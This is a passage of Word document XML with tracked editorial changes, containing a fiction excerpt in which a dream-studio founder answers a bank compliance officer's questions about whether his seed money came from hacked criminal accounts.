            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>O</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3220" w:author="TextVet" w:date="2016-03-29T14:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004F5581">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>And o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>thers realize that the thing they thought they needed was something they already had all along. That’s why we’re here.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="3221" w:author="TextVet" w:date="2016-03-29T14:21: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“Doctor, I do have a question,” Alyssa said, still unsteady on her feet. “Around the end there, while I was waking up… Why did all of my cupcakes grow arms and legs and start kung-fu fighting?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C75F7" w:rsidRPr="000D3488" w:rsidRDefault="006C75F7" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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“God damn it, Moshen!”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Daniel crashed through the double doors of the Realtime Creative Control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Moshen, giggling hysterically, sat at a desk similar to Daniel’s. His wraparound screen was covered in tree-like diagrams and artistic sketches — a sort of nonlinear comic strip, where each square had three or four different panels </w:t>
      </w:r>
      <w:del w:id="3222" w:author="TextVet" w:date="2016-03-29T14:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006C75F7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>follow</w:t>
      </w:r>
      <w:ins w:id="3223" w:author="TextVet" w:date="2016-03-29T14:22:00Z">
        <w:r w:rsidR="006C75F7">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it. Unlike Daniel’s pristine console, Moshen’s workstation was littered with soda and Cheetos; and while Daniel’s monitor was translucent, the screen before Moshen’s face sported an animated background of knights and dragons. Moshen himself was neither small nor scrawny anymore, but he still laughed with the sly mirth of a prank-pulling adolescent</w:t>
      </w:r>
      <w:del w:id="3224" w:author="TextVet" w:date="2016-03-29T14:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00762386">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> boy</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w:t>
      </w:r>
      <w:ins w:id="3225" w:author="TextVet" w:date="2016-03-29T14:22:00Z">
        <w:r w:rsidR="00620D0D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3226" w:author="TextVet" w:date="2016-03-29T14:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00620D0D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">o </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>you think that was </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>funny</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?” Daniel demanded.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Beside Moshen’s desk were two others. Mike sat at one, his thick scruff now graying. His screen was strewn with annnotated pictures of people’s faces — some photographed, some rendered, and some simply cartoons. At the other sat Rosie, grown well into adulthood, holding a stylus in her hand and wearing polarized glasses to view her console — which was filled with 3D wireframe models of houses, furniture, trees, and shops. Above their desks, respectively, stood placards reading “PLOT”, “CHARACTER”, and “SETTING”.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All three</w:t>
      </w:r>
      <w:del w:id="3227" w:author="TextVet" w:date="2016-03-29T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0032103D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of them</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> were silently laughing. Their shoulders shook, their eyes twinkled at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Daniel’s stern face collapsed into a chuckle. “Alright, yes. That </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> pretty cute, guys.”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From across the room, past the desks of two dozen other supporting employees, Daniel heard a loud, “Ahem!” Jason sat at a small conference table behind a glass partition near the reception area. Seated across from him was a tall, thin, bespectacled man in a well-worn suit. </w:t>
      </w:r>
      <w:r w:rsidR="005B7C11">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>His</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> voice growing </w:t>
      </w:r>
      <w:r w:rsidR="005B7C11">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ever </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dry</w:t>
      </w:r>
      <w:r w:rsidR="005B7C11">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with age, Jason </w:t>
      </w:r>
      <w:r w:rsidR="005B7C11">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>declared</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, “And </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>here, Mr. Caldwell, is the CTO and co-founder of this organization.” As Daniel trod over and exchanged handshakes and pleasure-to-meet-yous with the visitor, Jason said, “Mr. Caldwell is a compliance officer at Morgan Stanley.”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“Ah, you must be here about our IPO!” Daniel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am,” Caldwell said humorlessly as Daniel sat down across from him. “I need to make sure that all of your assets are properly accounted for before we can move forward with the underwriting. I’m hoping you can resolve a few anomalies about the origins of this facility.”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Daniel took a deep breath, leaned back slowly, and splayed his fingers toward the newcomer. “We</w:t>
      </w:r>
      <w:bookmarkStart w:id="3228" w:name="_GoBack"/>
      <w:ins w:id="3229" w:author="TextVet" w:date="2016-03-29T14:26:00Z">
        <w:r w:rsidR="009571AB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkEnd w:id="3228"/>
      <w:del w:id="3230" w:author="TextVet" w:date="2016-03-29T14:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009571AB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ve nothing to hide, Mr. Caldwell. T and I built this place from scratch. — Er, that’s Christina, I mean. My partner. In every sense.” He proudly rubbed his wedding ring. “She should meet you, actually. She’s doing post-session diagnostics right now, but I can call her once she’s done.”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“Perhaps,” replied Caldwell, jotting notes. “Does she know about the illegal source of your seed capital?”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Daniel cocked his head. “I beg your pardon?”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Zheleznov fortune,” said Caldwell, punctuating the statement by pushing his glasses higher up the bridge of his nose. “Let’s speak frankly here. Both Sergey Mukhayev’s and Ivan Zheleznov’s accounts were compromised during the events of the Medina Gallante. Both men died that day. You were identified and investigated, but ultimately no prosecutor could find enough evidence to implicate you. Hard drives were found scrubbed, log files </w:t>
      </w:r>
      <w:del w:id="3231" w:author="TextVet" w:date="2016-03-29T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00397E60">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">were </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">missing, phone records </w:t>
      </w:r>
      <w:del w:id="3232" w:author="TextVet" w:date="2016-03-29T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00397E60">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">were </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>obfuscated. Several years later, you returned from relative obscurity, with millions of dollars to pour into this project here. The obvious conclusions are a bit unsavory.”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Daniel looked directly into Caldwell’s eyes. “That </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the impression that you might be left with, if all your information comes from my interviews with </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Wired</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Gawker. And I imagine those media outlets edited me like that intentionally — controversy generates click revenue, after all. But let me clarify a few things. First, the police seized most of Sergey’s money. The little that was left, we were going to spend on Leo’s legal defense fund. But he insisted we use it for private school and college for </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Rosie. That’s why Leo ended up taking the fall for all Mukhayev family operations, and why he’s still in prison. Rosie still visits him regularly.”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Caldwell scoffed. “That accounts for the molehill, but not the mountain. What about all the money from the Zheleznov consortium?”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Daniel exchanged a wry look with Jason. “We never actually hacked that account.”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Caldwell peered over the top of his glasses.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“We were able to deduce its balance, yes,” said Daniel. “But we never managed to </w:t>
      </w:r>
      <w:r w:rsidRPr="00235AF2">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3233" w:author="TextVet" w:date="2016-03-29T14:30:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>crack</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> into it. Ivan used an OTP keyfob</w:t>
      </w:r>
      <w:ins w:id="3234" w:author="TextVet" w:date="2016-03-29T14:29:00Z">
        <w:r w:rsidR="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3235" w:author="TextVet" w:date="2016-03-29T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> all transfers required two-factor authentication. Our promise to split the fortune among his men… It was a bluff. Even if we</w:t>
      </w:r>
      <w:ins w:id="3236" w:author="TextVet" w:date="2016-03-29T14:30:00Z">
        <w:r w:rsidR="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3237" w:author="TextVet" w:date="2016-03-29T14:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d gotten his password, we</w:t>
      </w:r>
      <w:ins w:id="3238" w:author="TextVet" w:date="2016-03-29T14:29:00Z">
        <w:r w:rsidR="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’d</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="3239" w:author="TextVet" w:date="2016-03-29T14:30:00Z">
        <w:r w:rsidR="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’ve</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> never</w:t>
      </w:r>
      <w:del w:id="3240" w:author="TextVet" w:date="2016-03-29T14:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00235AF2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> would have</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> been able to move his money. We were never particularly good hackers.”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Caldwell looked around the room. “So where </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>did</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the support for all this come from?”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Daniel smiled. “From me, actually. But I was only able to do it thanks to this guy.” He jerked his thumb at Jason, who blushed. “When the assets of Claymore Communications, my old company, finally went up for auction, he used his private funds to make winning bids on everything that I had personally developed during my years there. My patents, my code, my designs — all the intellectual property </w:t>
      </w:r>
      <w:del w:id="3241" w:author="TextVet" w:date="2016-03-29T14:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001C61C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:ins w:id="3242" w:author="TextVet" w:date="2016-03-29T14:31:00Z">
        <w:r w:rsidR="001C61C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3243" w:author="TextVet" w:date="2016-03-29T14:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001C61C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d produced while salaried for them. He bought it up. And then… he gave it all to me. Gifted it. He called it a bonus.”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added, “You were right from the very start, Dan. It was rightfully yours.”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licensed my technologies to cellular providers,” Daniel continued. “And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is where I got the revenue to build this place.”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Caldwell made a few noncommittal grunts as he scribbled </w:t>
      </w:r>
      <w:del w:id="3244" w:author="TextVet" w:date="2016-03-29T14:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B8362A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">on his </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>note</w:t>
      </w:r>
      <w:ins w:id="3245" w:author="TextVet" w:date="2016-03-29T14:32:00Z">
        <w:r w:rsidR="00B8362A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3246" w:author="TextVet" w:date="2016-03-29T14:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B8362A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>pad</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
